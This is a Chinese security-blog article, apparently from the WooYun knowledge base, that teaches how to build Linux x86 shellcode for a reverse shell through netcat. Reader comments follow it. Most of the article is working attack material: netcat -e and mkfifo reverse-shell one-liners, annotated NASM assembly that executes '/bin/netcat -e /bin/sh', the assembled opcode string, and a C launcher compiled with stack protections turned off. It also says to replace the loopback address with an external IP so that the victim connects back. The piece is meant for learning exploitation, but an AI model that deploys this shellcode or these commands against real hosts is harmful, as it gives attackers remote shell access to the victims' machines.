@@ -1,0 +1,59 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">使用netcat进行反弹链接的shellcode</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">∑-TEAM</a> <span class="bull">·</span> <time title="2014/04/03 16:23" ui-time="" datetime="2014/04/03 16:23" class="published ng-binding ng-isolate-scope">2014/04/03 16:23</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>from:<a href="http://morgawr.github.io/hacking/2014/03/29/shellcode-to-reverse-bind-with-netcat/">http://morgawr.github.io/hacking/2014/03/29/shellcode-to-reverse-bind-with-netcat/</a></p><p>这篇文章主要是谈，在远程溢出时怎样构造shellcode，才能形成一个有效的反弹链接。</p><h2>0x00 反向绑定远程shell</h2><hr><p>让本地主机和远程shell建立起连接的方法有很多种，其中最常见的是在远程主机上开放一个端口，然后把它的</p><pre><code>stdout/stderr/stdin
+</code></pre><p>重定向到一个shell上。</p><p>这样我们就可以在自己的主机上通过一个简单的netcat命令来连接它。</p><p>但是，大多数情况下这种方法并不能起作用，很多服务器只对外开放少量的几个端口，比如，http(s),ftp,smtp等。</p><p>其他的数据包都会被防火墙直接丢弃。解决这种问题的方法就是使用反弹链接，反弹链接的意思就是，让远程的主机主动连接我们的服务器。</p><p>所以，你需要在自己的机器上开放一个端口，等待着倒霉的受害者自己连接你的主机就可以了。</p><h2>0x01 netcat -e命令</h2><hr><p>首先我们假设，目标网站上安装了netcat。</p><p>通常情况下netcat支持e参数，这个参数将会运行后面所跟的程序，并将它跟链接绑定。</p><p>如果我们把<code>/bin/sh</code>通过e参数绑定，并开启监听，那当我们使用远程主机连接到这台主机时，就相当于获得了一个shell。让我们来尝试一下。</p><p>在本地主机运行</p><pre><code>#!bash
+netcat -lvp 9999
+</code></pre><p>监听连入的链接。</p><p>新开一个shell运行</p><pre><code>#!bash
+netcat -e /bin/sh 127.0.0.1 9999  
+</code></pre><p>这样，你的第一个shell将建立起一个链接，在其中执行<code>ls whoami</code> 等命令，测试一下它是否可以正常工作，<br>你也可以使用 Ctrl+c 来关闭这个链接。</p><p>注意:openbsd版本的netcat不支持 -e或者-c 参数。</p><p>你可以使用以下的语句来替代。</p><pre><code>#!bash
+rm -f /tmp/f; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc -l 127.0.0.1 9999 &gt; /tmp/f
+</code></pre><p>但是它太复杂了，很难在shellcode中运行。</p><h2>0x02 汇编代码</h2><hr><p>现在我们就来看一下怎样把这条语句通过汇编执行，并放入shellcode中。</p><p>下面是，我们shellcode重要运行的汇编代码。(intel语法)</p><pre><code>#!bash
+jmp short       forward
+back:
+pop             esi
+xor             eax, eax
+mov byte        [esi + 11], al    ; terminate /bin/netcat
+mov byte        [esi + 14], al    ; terminate -e
+mov byte        [esi + 22], al    ; terminate /bin/sh
+mov byte        [esi + 38], al    ; terminate 127.127.127.127
+mov byte        [esi + 43], al    ; terminate 9999
+mov long        [esi + 44], esi   ; address of /bin/netcat in AAAA
+lea             ebx, [esi + 12]   ; get address of -e  
+mov long        [esi + 48], ebx   ; store address of -e in BBBB 
+lea             ebx, [esi + 15]   ; get address of /bin/sh
+mov long        [esi + 52], ebx   ; store address of /bin/sh in CCCC
+lea             ebx, [esi + 23]   ; get address of 127.127.127.127
+mov long        [esi + 56], ebx   ; store address of 127.127.127.127 in DDDD
+lea             ebx, [esi + 39]   ; get address of 9999
+mov long        [esi + 60], ebx   ; store address of 9999 in EEEE
+mov long        [esi + 64], eax   ; put NULL in FFFF
+mov byte        al, 0x0b          ; pass the execve syscall number as argument
+mov             ebx, esi          
+lea             ecx, [esi + 44]   ; /bin/netcat -e /bin/sh etc etc
+lea             edx, [esi + 64]   ; NULL
+int             0x80              ; Run the execve syscall
+
+forward:
+call            back
+db "/bin/netcat#-e#/bin/sh#127.127.127.127#9999#AAAABBBBCCCCDDDDEEEEFFFF"
+</code></pre><p>其实上面代码想做的翻译成c语言是如下两行</p><pre><code>#!c
+char *command[] = {"/bin/netcat", "-e", "/bin/sh", "127.127.127.127", "9999", NULL};
+execve(command[0], command, NULL);
+</code></pre><p>命令就是如下的字符串</p><pre><code>#!bash
+/bin/netcat#-e#/bin/sh#127.127.127.127#9999#AAAABBBBCCCCDDDDEEEEFFFF
+</code></pre><p>字符串中各个部分被<code>#</code>隔开，是因为在shellcode中不能出现null，这会造成shellcode被截断，从而不能被<br>目标主机正确运行。</p><p>不管我们在哪里运行这段程序，首先需要知道的是命令字符串的地址。</p><p>所以我在第1行和第26行分别创建了两个标签（forword和back），使用call命令时(27行)，首先会把返回地址入栈，返回地址就是下一条指令的地址，而下一条指令的地址恰巧就是我们的命令字符串。</p><p>回到第3行，我们把命令字符串地址弹出到ESI寄存器，然后将EAX初始化，注意我们不能直接使用</p><pre><code>#!bash
+mov eax,0
+</code></pre><p>因为null在shellcode中是不允许出现的。最后我们吧，命令字符串分开存放到内存之中。</p><p><img alt="1396093148.png" img-src="bb45c4efe62d7c0e3b707b9a4d5514cf39f719af.jpg"></p><p>在第5行到第9行，我们把寄存器中的0移动到字符串的末尾，使用替代<code>#</code>（取自eax寄存器，其中的0使用xor生成）之后我们需要一个各个字符串地址的数组，作为execve()的第二个参数。</p><p>在第十行，我们把 <code>/bin/netcat</code> 的地址放入 AAAA 所在的位置，程序中的11到18行也是在做同样的事情，最后19行我们把存入到FFFF的位置，作为字符串的结尾。</p><p>在第20行我们准备执行系统调用，我们首先把0xb存储到eax中，esi(/bin/netcat的地址)存储到ebx中，字符串的地址存储到，ecx中，最后edx存储null，之后使用0x80触发系统调用，不出意外的话，一个反弹链接的指令就成功执行了。</p><p>这个例子中，ip地址使用的是127.127.127.127  端口号是 9999，这是一个本地的ip地址。通常情况下<br>你需要使用一个外网IP来替换掉它，如果两个ip长度不同的话，你要仔细的修改掉所有与他相关联的汇编代码。</p><h2>0x03 编译测试shellcode</h2><hr><p>现在，需要把汇编代码存储到一个asm文件之中，我们这里叫做shell.asm,使用以下的语句编译它，</p><pre><code>#!bash
+nasm -felf32 -o shell.o shell.asm
+</code></pre><p>使用，<code>objdump -D</code>命令我们就可以看到这个小程序的opcodes,使用下面一段指令我们就可以把它们<br>放入到一个C字符串中</p><pre><code>#!bash
+for i in $(objdump -d shell.o -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
+</code></pre><p>最后我们得到</p><pre><code>\xeb\x3c\x5e\x31\xc0\x88\x46\x0b\x88\x46\x0e\x88\x46\x16\x88\x46\x26\x88\x46\x2b\x89\x76\x2c\x8d\x5e\x0c\x89\x5e\x30\x8d\x5e\x0f\x89\x5e\x34\x8d\x5e\x17\x89\x5e\x38\x8d\x5e\x27\x89\x5e\x3c\x89\x46\x40\xb0\x0b\x89\xf3\x8d\x4e\x2c\x8d\x56\x40\xcd\x80\xe8\xbf\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x65\x74\x63\x61\x74\x23\x2d\x65\x23\x2f\x62\x69\x6e\x2f\x73\x68\x23\x31\x32\x37\x2e\x31\x32\x37\x2e\x31\x32\x37\x2e\x31\x32\x37\x23\x39\x39\x39\x39\x23\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44\x45\x45\x45\x45\x46\x46\x46\x46
+</code></pre><p>最后我们使用一段c程序来验证这个shell是否可行。</p><pre><code>#!c
+char shellcode[] = "\xeb\x3c\x5e\x31\xc0\x88\x46\x0b\x88\x46\x0e\x88\x46\x16\x88\x46\x26\x88\x46\x2b\x89\x76\x2c\x8d\x5e\x0c\x89\x5e\x30\x8d\x5e\x0f\x89\x5e\x34\x8d\x5e\x17\x89\x5e\x38\x8d\x5e\x27\x89\x5e\x3c\x89\x46\x40\xb0\x0b\x89\xf3\x8d\x4e\x2c\x8d\x56\x40\xcd\x80\xe8\xbf\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x65\x74\x63\x61\x74\x23\x2d\x65\x23\x2f\x62\x69\x6e\x2f\x73\x68\x23\x31\x32\x37\x2e\x31\x32\x37\x2e\x31\x32\x37\x2e\x31\x32\x37\x23\x39\x39\x39\x39\x23\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44\x45\x45\x45\x45\x46\x46\x46\x46";
+
+int main()
+{
+    int (*ret)() = (int(*)())shellcode;
+    ret();
+}
+</code></pre><p>想要编译它，需要关闭一些安全编译选项，然后使用如下命令。</p><pre><code>#!bash
+gcc shellcode.c -fno-stack-protector -z execstack -o shellcode  
+</code></pre><p>在另一个shell中运行<code>netcat -lvp 9999</code>，然后运行这个c程序<code>./shellcode</code>如果一切正确的话你就可以得到一个反弹链接的shell了。</p><p><img alt="1396096315.png" img-src="783fbcf658201a2178739114323f9b363fcb9eb3.jpg"></p><p>happy hacking!</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/3071" rel="bookmark" id="re1">Blind Return Oriented Programming (BROP) Attack - 攻击原理</a></li><li><a href="http://drops.wooyun.org/tips/2288" rel="bookmark" id="re2">64位Linux下的栈溢出</a></li><li><a href="http://drops.wooyun.org/tips/2728" rel="bookmark" id="re3">逆向基础（十）</a></li><li><a href="http://drops.wooyun.org/tips/4715" rel="bookmark" id="re4">如何发现 NTP 放大攻击漏洞</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">憨哥</span> <span class="reply-time">2015-11-02 11:39:55</span></div><p></p><p>感谢！！！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Evil</span> <span class="reply-time">2015-03-27 15:18:23</span></div><p></p><p>好厉害 你就是那个FBI NSA 要抓的国产007是吧。</p><p>小伙子不要怕,在China 组织会保护你的。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">动后河</span> <span class="reply-time">2014-12-13 21:08:42</span></div><p></p><p>顶一顶</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">大和尚</span> <span class="reply-time">2014-04-09 15:41:13</span></div><p></p><p>好文章! 已收藏</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">不告诉你</span> <span class="reply-time">2014-04-06 20:21:51</span></div><p></p><p>有没有觉得 文章越来越多了, 也更加不好翻 以往 的 文章了,是不是 考虑 做个 更加 细的 分类 , 比如 xss , sql 注入 ,服务器安全, 漏洞分析(java ,php ) 等等 进行 细分 . 或者 提供 按 文章标题 的 时间轴 进行 文档 归档 呢?</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">核攻击</span> <span class="reply-time">2014-04-05 10:02:57</span></div><p></p><p>good!</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">aaa</span> <span class="reply-time">2014-04-04 18:57:06</span></div><p></p><p>翻译的不错，可以再加上端口复用的技术</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瞌睡龙</span> <span class="reply-time">2014-04-04 11:33:59</span></div><p></p><p>这文章主要是了解下shellcode，不是具体利用哈，知识库这方面较少，准备从科普慢慢走起！~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">abc</span> <span class="reply-time">2014-04-03 22:38:36</span></div><p></p><p>讲的很好啊</p><p>另外，打印opcode时，也可以用hexdump:<br>hexdump -v -e '"\\\x" 1/1 "%02x"' ../shellcode</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Evil</span> <span class="reply-time">2014-04-03 20:48:54</span></div><p></p><p>如果能反弹回来,就不用这么麻烦了呀...</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Evil</span> <span class="reply-time">2014-04-03 20:48:30</span></div><p></p><p>但是，大多数情况下这种方法并不能起作用，很多服务器只对外开放少量的几个端口，比如，http(s),ftp,smtp等。</p><p>其他的数据包都会被防火墙直接丢弃。解决这种问题的方法就是使用反弹链接，反弹链接的意思就是，让远程的主机主动连接我们的服务器。</p><p>所以，你需要在自己的机器上开放一个端口，等待着倒霉的受害者自己连接你的主机就可以了。</p><p>-------------------------------------------------------------------------------------------------------</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Malayke</span> <span class="reply-time">2014-04-03 17:38:50</span></div><p></p><p>好高深啊，不过还是顶一个！</p><p></p></div></div></div></div></div></main>
